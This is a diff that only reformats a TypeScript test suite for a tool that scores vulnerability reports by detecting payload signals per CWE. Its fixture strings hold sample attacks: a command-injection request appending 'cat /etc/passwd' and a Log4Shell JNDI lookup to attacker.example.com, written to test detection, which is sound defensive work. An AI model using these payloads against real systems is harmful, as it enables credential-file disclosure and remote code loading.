@@ -153,7 +153,9 @@ q=<sql payload here>
 
 Payload: \`<inject>\` against the search endpoint.
 `;
-      expect(goldValues(text, ["CWE-89"])).not.toContain("sql_injection_payload");
+      expect(goldValues(text, ["CWE-89"])).not.toContain(
+        "sql_injection_payload",
+      );
     });
   });
 
@@ -171,7 +173,9 @@ $ curl 'https://api.example.com/api/diag?host=localhost; cat /etc/passwd'
 
 Source: src/api/diag.go:31
 `;
-      expect(goldValues(text, ["CWE-78"])).toContain("command_injection_payload");
+      expect(goldValues(text, ["CWE-78"])).toContain(
+        "command_injection_payload",
+      );
     });
 
     it("emits command_injection_payload for a JNDI Log4Shell payload", () => {
@@ -184,7 +188,9 @@ Host: api.example.com
 User-Agent: \${jndi:ldap://attacker.example.com/exploit}
 \`\`\`
 `;
-      expect(goldValues(text, ["CWE-917"])).toContain("command_injection_payload");
+      expect(goldValues(text, ["CWE-917"])).toContain(
+        "command_injection_payload",
+      );
     });
 
     it("does NOT emit command_injection_payload for a placeholder slot", () => {
@@ -201,7 +207,9 @@ Content-Type: application/json
 
 Send: \`<inject>\` to /api/run.
 `;
-      expect(goldValues(text, ["CWE-78"])).not.toContain("command_injection_payload");
+      expect(goldValues(text, ["CWE-78"])).not.toContain(
+        "command_injection_payload",
+      );
     });
   });
 
@@ -302,7 +310,9 @@ GET /api/fetch?url=<metadata-url> HTTP/1.1
 Host: target.com
 \`\`\`
 `;
-      expect(goldValues(text, ["CWE-918"])).not.toContain("ssrf_metadata_target");
+      expect(goldValues(text, ["CWE-918"])).not.toContain(
+        "ssrf_metadata_target",
+      );
     });
   });
 
@@ -347,7 +357,9 @@ Host: target.com
 
 Send: \`<traversal>\` to read system files.
 `;
-      expect(goldValues(text, ["CWE-22"])).not.toContain("path_traversal_payload");
+      expect(goldValues(text, ["CWE-22"])).not.toContain(
+        "path_traversal_payload",
+      );
     });
   });
 
@@ -405,7 +417,9 @@ loading enabled (XML_PARSE_NOENT). Source: src/api/Importer.java:118.
 
 Replace \`<placeholder>\` with the file you want to read.
 `;
-      expect(goldValues(text, ["CWE-611"])).not.toContain("xxe_external_entity");
+      expect(goldValues(text, ["CWE-611"])).not.toContain(
+        "xxe_external_entity",
+      );
     });
   });
 
@@ -458,7 +472,9 @@ Host: target.com
 <payload>
 \`\`\`
 `;
-      expect(goldValues(text, ["CWE-502"])).not.toContain("deserialization_gadget");
+      expect(goldValues(text, ["CWE-502"])).not.toContain(
+        "deserialization_gadget",
+      );
     });
   });
 
@@ -647,10 +663,15 @@ table.
         signals: Array<{ id: string; weight: number }>;
       };
       expect(breakdown.bonus).toBeGreaterThan(0);
-      const sqlEntry = breakdown.signals.find((s) => s.id === "sql_injection_payload");
+      const sqlEntry = breakdown.signals.find(
+        (s) => s.id === "sql_injection_payload",
+      );
       expect(sqlEntry?.weight).toBe(GOLD_SIGNAL_WEIGHTS.sql_injection_payload);
       // Sum of per-category weights matches the rawSum reported.
-      const reportedSum = breakdown.signals.reduce((acc, s) => acc + s.weight, 0);
+      const reportedSum = breakdown.signals.reduce(
+        (acc, s) => acc + s.weight,
+        0,
+      );
       expect(reportedSum).toBe(breakdown.rawSum);
       // Applied bonus equals min(rawSum, cap).
       expect(breakdown.bonus).toBe(Math.min(breakdown.rawSum, breakdown.cap));
@@ -683,7 +704,9 @@ attacker-readable file and /etc/shadow.
         bonus: number;
         signals: Array<{ id: string; weight: number }>;
       };
-      const toctouEntry = breakdown.signals.find((s) => s.id === "filesystem_toctou");
+      const toctouEntry = breakdown.signals.find(
+        (s) => s.id === "filesystem_toctou",
+      );
       expect(toctouEntry?.weight).toBe(GOLD_SIGNAL_WEIGHTS.filesystem_toctou);
       // The configured per-category weight is strictly lower than the
       // payload-class HIGH-weight categories.
@@ -797,10 +820,12 @@ table.
       const onlyDiff = boostedGold.filter((g) => !baseGold.includes(g));
       expect(onlyDiff).toEqual(["sql_injection_payload"]);
 
-      const baseBonus =
-        (baseline.signalBreakdown.goldSignalBonus as { bonus: number }).bonus;
-      const boostedBonus =
-        (boosted.signalBreakdown.goldSignalBonus as { bonus: number }).bonus;
+      const baseBonus = (
+        baseline.signalBreakdown.goldSignalBonus as { bonus: number }
+      ).bonus;
+      const boostedBonus = (
+        boosted.signalBreakdown.goldSignalBonus as { bonus: number }
+      ).bonus;
 
       // The applied bonus delta equals the sql_injection_payload weight,
       // and (since the boosted score is well below the +95 ceiling) the
